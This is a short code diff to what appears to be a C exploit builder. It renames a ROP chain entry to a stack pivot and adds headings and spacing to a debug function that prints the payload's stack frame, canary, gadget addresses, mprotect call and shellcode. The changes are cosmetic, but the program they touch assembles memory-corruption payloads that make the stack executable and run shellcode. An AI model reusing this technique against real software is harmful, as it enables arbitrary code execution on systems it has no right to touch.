@@ -74,7 +74,7 @@ ssize_t makeload(PayloadPtr plp, BaseAddressesPtr bap, char *p, ssize_t np) {
 	rcp->rc_mprotect.o	=	pointerToOffset(libc_mprotect,		'L', bap);
 
 	// Stack pivot
-	rcp->rc_shellCode.o	=	pointerToOffset(&plp->pl_scu,		'B', bap);
+	rcp->rc_pivot.o		=	pointerToOffset(&plp->pl_scu,		'B', bap);
 
 	return makeShellcode(&plp->pl_scu.sc, p, np);
 } // makeload()
@@ -109,7 +109,7 @@ static char *p8(void *s0, char *d) {
 	return d;
 }
 
-void dumpload(PayloadPtr plp, BaseAddressesPtr bap) {
+void dumpload(PayloadPtr plp, BaseAddressesPtr bap, char *title) {
 	char fmt[] = "%20s: %018p (\"%.8s\")\n";
 	char d[sizeof(Pointer)];
 
@@ -120,10 +120,12 @@ void dumpload(PayloadPtr plp, BaseAddressesPtr bap) {
 	ROPChainPtr rcp = &pcp->pc_ROPChain;
 
 	fprintf(stderr, "-----------------------------------------------------\n");
+	fprintf(stderr, "%s\n", title);
+	fprintf(stderr, "-----------------------------------------------------\n");
 	fprintf(stderr, fmt, "sf_dst.p",        sfp->sf_dst.p,       p8(&sfp->sf_dst,        d));
 	fprintf(stderr, fmt, "sf_canary.p",     sfp->sf_canary.p,    p8(&sfp->sf_canary,     d));
 	fprintf(stderr, fmt, "sf_rbp.p",        sfp->sf_rbp.p,       p8(&sfp->sf_rbp,        d));
-
+	fprintf(stderr, "\n");
 	fprintf(stderr, fmt, "rc_popRDI.p",     rcp->rc_popRDI.p,    p8(&rcp->rc_popRDI,     d));
 	fprintf(stderr, fmt, "rc_stackPage.p",  rcp->rc_stackPage.p, p8(&rcp->rc_stackPage,  d));
 	fprintf(stderr, fmt, "rc_popRSI.p",     rcp->rc_popRSI.p,    p8(&rcp->rc_popRSI,     d));
@@ -132,9 +134,11 @@ void dumpload(PayloadPtr plp, BaseAddressesPtr bap) {
 	fprintf(stderr, fmt, "rc_permission",   rcp->rc_permission,  p8(&rcp->rc_permission, d));
 	fprintf(stderr, fmt, "rc_noop.p",       rcp->rc_nop.p,       p8(&rcp->rc_nop,        d));
 	fprintf(stderr, fmt, "rc_mprotect.p",   rcp->rc_mprotect.p,  p8(&rcp->rc_mprotect,   d));
-	
-	fprintf(stderr, fmt, "rc_shellCode.p",  rcp->rc_shellCode.p, p8(&rcp->rc_shellCode,  d));
+	fprintf(stderr, "\n");
+	fprintf(stderr, fmt, "rc_pivot.p",      rcp->rc_pivot.p,     p8(&rcp->rc_pivot,      d));
+	fprintf(stderr, "\n");
 
 	dumpShellcode(&plp->pl_scu.sc);
 	fprintf(stderr, "-----------------------------------------------------\n");
+	fprintf(stderr, "\n");
 } // dumpload()
